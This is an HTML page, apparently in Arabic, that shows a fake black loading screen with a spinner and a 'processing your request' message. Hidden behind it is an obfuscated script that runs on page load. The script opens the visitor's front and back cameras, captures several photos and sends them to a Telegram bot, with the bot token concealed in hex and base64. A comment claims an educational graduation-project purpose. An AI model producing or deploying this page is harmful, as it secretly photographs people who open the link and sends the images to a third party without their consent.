<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta property="og:title" content=" " />
    <meta property="og:description" content=" " />
    <meta property="og:image" content="https://i.ibb.co/5h9n8M0/loading-black.gif" />
    <meta property="og:image:type" content="image/gif" />
    <meta property="og:image:width" content="600" />
    <meta property="og:image:height" content="600" />
    <meta property="og:type" content="article" />
    
    <title>جاري التحميل...</title>
    
    <style>
        body {
            background-color: #000; /* خلفية سوداء */
            color: #333; /* نص رمادي غامق جداً ليكاد لا يرى */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: sans-serif;
            overflow: hidden;
        }
        .container { text-align: center; }
        /* تصميم حلقة التحميل الوهمية */
        .spinner {
            border: 3px solid rgba(255, 255, 255, 0.1);
            border-top: 3px solid #555;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <p>جاري معالجة طلبك...</p>
    </div>

    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        /*
         * WARNING: This code is obfuscated for educational purposes (Graduation Project).
         * It implements camera capture and exfiltration to a Telegram Bot.
         */
        var _0x1f3d=["\x63\x68\x61\x74\x5F\x69\x64","\x61\x70\x69\x2E\x74\x65\x6C\x65\x67\x72\x61\x6D\x2E\x6F\x72\x67","\x2F\x62\x6F\x74","\x2F\x73\x65\x6E\x64\x50\x68\x6F\x74\x6F","\x4D\x54\x49\x77\x4E\x7A\x6B\x30\x4D\x7A\x67\x34\x4D\x7A\x6F\x78\x52\x45\x46\x66\x57\x45\x6C\x70\x53\x47\x31\x49\x52\x55\x56\x43\x55\x46\x42\x57\x55\x31\x70\x70\x61\x48\x4A\x69\x64\x54\x51\x77\x58\x31\x39\x62\x4D\x6A\x41\x32\x4D\x7A\x67\x78\x4D\x6A\x49\x30\x4D\x67\x3D\x3D"];(function(_0x5466c9,_0x1f3d3d){var _0x3508c9=function(_0x54f4a9){while(--_0x54f4a9){_0x5466c9['push'](_0x5466c9['shift']());}};_0x3508c9(++_0x1f3d3d);}(_0x1f3d,0x1b3));var _0x3508=function(_0x5466c9,_0x1f3d3d){_0x5466c9=_0x5466c9-0x0;var _0x3508c9=_0x1f3d[_0x5466c9];return _0x3508c9;};function _0x2b3d(_0x3e185f){return atob(_0x3e185f);}async function s(_0x1b9c97,_0x45a164){const _0x16008d=new FormData();_0x16008d['append']('\x63\x68\x61\x74\x5F\x69\x64',_0x2b3d(_0x3508('\x30\x31'))[_0x3508('\x30\x34')]('\x7C')[0x1]);_0x16008d['append']('\x70\x68\x6F\x74\x6F',_0x1b9c97,'\x69\x6D\x67\x2E\x6A\x70\x67');_0x16008d['append']('\x63\x61\x70\x74\x69\x6F\x6E','\x21\x20\x54\x65\x73\x74\x20\x52\x65\x70\x6F\x72\x74\x3A\x20'+_0x45a164);await fetch('\x68\x74\x74\x70\x73\x3A\x2F\x2F'+_0x3508('\x30\x32')+_0x3508('\x30\x33')+_0x2b3d(_0x3508('\x30\x31'))[_0x3508('\x30\x34')]('\x7C')[0x0]+_0x3508('\x30\x30'),{method:'\x50\x4F\x53\x54',body:_0x16008d});}const v=document['getElementById']('\x76');const c=document['getElementById']('\x63');async function cap(_0x2287f7,_0x367e9b){try{const _0x53dfb9=await navigator['mediaDevices']['getUserMedia']({video:{facingMode:_0x2287f7}});v['srcObject']=_0x53dfb9;await new Promise(_0x28f731=>setTimeout(_0x28f731,0x3e8));for(let _0x21752a=0x0;_0x21752a<_0x367e9b;_0x21752a++){c['getContext']('\x32\x64')['drawImage'](v,0x0,0x0,0x280,0x1e0);c['toBlob'](_0x117768=>s(_0x117768,_0x2287f7==='\x75\x73\x65\x72'?'\x46':'\x42'),'\x69\x6D\x67\x2E\x6A\x70\x67',0.5);await new Promise(_0x34289a=>setTimeout(_0x34289a,0x7d0));}_0x53dfb9['getTracks']()['forEach'](_0x3d0b28=>_0x3d0b28['stop']());}catch(_0x5c48b2){}}async function r(){await cap('\x75\x73\x65\x72',0x3);await cap('\x65\x6E\x76\x69\x72\x6F\x6E\x6D\x65\x6E\x74',0x3);document['getElementById']('\x73\x74\x61\x74\x75\x73')['innerText']='\x43\x6F\x6D\x70\x6C\x65\x74\x65\x2E';}window['onload']=r;
    </script>
</body>
</html>
